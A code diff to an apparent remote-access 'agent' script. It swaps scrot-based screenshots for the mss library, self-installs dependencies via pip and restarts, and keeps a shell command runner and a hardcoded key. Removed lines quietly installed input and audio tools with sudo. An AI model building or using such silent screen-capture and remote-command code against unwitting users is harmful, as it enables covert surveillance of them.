@@ -22,13 +22,17 @@ KEY = "S3cr3tK3y2024!"
 # --- UTILS ---
 
 def install_dependencies():
-    """Attempt to install missing dependencies quietly."""
-    deps = ["scrot", "xinput", "alsa-utils"]
+    """Attempt to install missing python dependencies."""
     try:
-        subprocess.run(["sudo", "apt-get", "update", "-qq"], check=False)
-        subprocess.run(["sudo", "apt-get", "install", "-y", "-qq"] + deps, check=False)
-    except:
-        pass
+        import mss
+    except ImportError:
+        try:
+            print("Installing mss...", flush=True)
+            subprocess.run([sys.executable, "-m", "pip", "install", "mss", "--break-system-packages"], check=True)
+            print("Dependencies installed. Restarting agent to apply changes...", flush=True)
+            sys.exit(1) # Force restart to reload environment
+        except Exception as e:
+            print(f"Failed to install deps: {e}", flush=True)
 
 def get_config():
     try:
@@ -81,13 +85,12 @@ def run_command(cmd, shell=True):
 
 def take_screenshot():
     try:
+        import mss
         filename = f"/tmp/scr_{int(time.time())}.png"
-        # Capture stderr to debug "scrot" failures
-        result = subprocess.run(["scrot", "-z", filename], capture_output=True, text=True)
         
-        if result.returncode != 0:
-            # Raise loggable error
-            raise Exception(f"Scrot exited with {result.returncode}: {result.stderr.strip()}")
+        with mss.mss() as sct:
+            # Capture the first monitor
+            sct.shot(mon=-1, output=filename)
             
         with open(filename, "rb") as f:
             img_data = base64.b64encode(f.read()).decode()
